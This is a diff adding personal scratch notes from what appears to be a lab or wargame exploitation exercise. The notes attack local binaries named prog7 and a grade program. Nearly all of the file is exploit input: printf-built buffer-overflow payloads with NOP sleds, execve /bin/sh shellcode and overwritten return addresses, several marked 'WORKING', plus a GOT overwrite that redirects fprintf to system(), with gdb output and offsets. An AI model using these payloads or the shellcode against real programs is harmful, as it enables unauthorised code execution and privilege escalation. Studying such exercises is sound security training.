@@ -1,0 +1,120 @@
+
+
+abcdefghAAAAmnopqrstuvwxyz1234567890abcdefghBBBBmnopqrstuvwxyz1234567890abcdefghCCCCmnopqrstuvwxyz1234567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZmnop
+
+405-408 is the address 
+525-528 is return ptr
+
+ffffdc4c
+
+`printf "\x4c\xdc\xff\xff"`
+
+x/128xw $esp
+
+try manipulating return
+
+`printf "\x3b\x85\x04\x08"` //add this twice at the end of the above
+
+
+`printf "\x60\xd8\xff\xff"` //add this twice at the end of the above
+
+//add stuff on stack, so all we have to do is add the nop sled and shellcode
+
+//64+16
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\x55\x48\x89\xe5\xbf\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x5d\xc3"`aaaaaaaaCCCCmnopqrstuvwxyz1234567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZmnop`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+right before ret: 0xffffdc5c:
+after return: 
+
+\x31\xc0\x50\x68\x2f\x2f\x67\x72\x61\x64\x65\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80
+
+//replacing 8 with 26 = so delete 18 bytes
+
+//reverted to sauce code
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"`aaastuvwxyz1234567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZmnop`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+//Attempt on new source code:
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`aaastuvwxyz1234567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZmnop`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+//WORKING:
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58"`567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZmnop`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58
+
+//try-out above with just /bin///grade
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\x31\xc0\x50\x68\x72\x61\x64\x65\x68\x2f\x2f\x2f\x67\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`aaaxyz1234567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZmnop`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+
+try changing endianess:
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\x31\xc0\x50\x68\x68\x73\x2f\x2f\x68\x6e\x69\x62\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`aaastuvwxyz1234567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZmnop`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+
+
+##############
+PART 2
+##############
+
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58"`567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZm`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+//WORKING:
+`printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58"`567890abcdefghDDDDmnopqrstuvwxyz1234567890abcdefghEEEEmnopqrstuvwxyz1234567890abcdefghFFFFmnopqrstuvwxyz1234567890abcdefghGGGGmnopqrstuvwxyz1234567890abcdefghHHHHmnopqrstuvwxyz1234567890abcdefghIIIImnopqrstuvwxyz1234567890abcdefghJJJJmnopqrstuvwxyz1234567890abcdefghKKKKmnopqrstuvwxyz1234567890abcdefgh`printf "\x0c\x85\x04\x08"`mnopqrstuvwxyz1234567890abcdefghMMMMmnopqrstuvwxyz1234567890abcdefghNNNNmnopqrstuvwxyz1234567890abcdefghZZZZm`printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"``printf "\x5c\xdc\xff\xff"`
+
+3136edaba2073a78ea960afef5b722b9:06037:00206:
+
+
+//###########################################
+//PART 3
+
+(gdb) x/i 0x8048440
+   0x8048440 <fprintf@plt>:	jmp    *0x8049864
+(gdb) x/i 0x8049864
+   0x8049864 <fprintf@got.plt>:	inc    %esi
+
+terrier037@bandit:~$ objdump --dynamic-reloc /usr/local/bin/prog7 | grep fprintf
+08049864 R_386_JUMP_SLOT   fprintf
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e64360 <system>
+
+(gdb) p execve
+$1 = {<text variable, no debug info>} 0xf7edaa70 <execve>
+
+
+`printf "\x64\x98\x04\x08"`
+
+r sh`perl -e 'print "A"x126'``printf "\x64\x98\x04\x08"` `printf "\x60\x43\xe6\xf7"`
+
+//working:
+prog7 sh`perl -e 'print "A"x126'``printf "\x64\x98\x04\x08"` `printf "\x60\x33\xe6\xf7"`
+
+"%s\n"
+
+
+registers before system:
+(gdb) info reg
+eax            0xf7fccac0	-134427968
+ecx            0xffffde59	-8615
+edx            0xffffdb7c	-9348
+ebx            0xf7fcc000	-134430720
+esp            0xffffdb60	0xffffdb60
+ebp            0xffffdc08	0xffffdc08
+esi            0x0	0
+edi            0x0	0
+eip            0x80485e2	0x80485e2 <main+166>
+eflags         0x246	[ PF ZF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+
+//64+38 = 102
+//128-102 = 26
+prog7 `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"``printf "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58"``perl -e 'print "A"x26'``printf "\x64\x98\x04\x08"` `printf "\xf0\xdd\xff\xff"`
+
+r sh`perl -e 'print "A"x126'``printf "\x64\x98\x04\x08"` `printf "\x90\xdb\xff\xff"`
+
+r sh`perl -e 'print "A"x126'``printf "\x64\x98\x04\x08"` `printf "\xe0\xdd\xff\xff"`
+
+http://www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf
